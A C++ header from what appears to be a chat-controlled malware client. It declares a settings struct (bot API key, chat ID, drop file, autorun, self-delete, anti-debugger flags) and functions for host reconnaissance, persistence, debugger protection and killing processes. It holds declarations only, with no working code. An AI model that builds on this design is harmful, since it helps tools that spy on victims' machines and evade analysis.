/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#pragma once
#ifndef MANAGER_H
#define MANAGER_H
#include "common.h"

#pragma pack(push, 1)
struct Settings {
	char botapi[128] = { 0 };
	char chatid[128] = { 0 };
	char drop[128] = { 0 };
	char autorun[128] = { 0 };
	char client_delay[128] = { 0 };
	bool auto_delete;
	bool autorun_state;
	bool drop_run;
	bool protect_debuggers;
};
#pragma pack(pop)

std::string GetOS();
std::string GetPCName();
std::string GetIP();
std::string ProcessList();
std::string DirectoryObjectsList(std::string dir);

long GetFileSize(const char* filename);
void ReadData(Settings* s);

void Autorun(const char* name);
void Protector();

std::string ToLower(std::string str);
std::vector<std::string> split(std::string str, char delim);

bool FileExists(std::string name);

bool CloseProcessByName(std::string procname);



#endif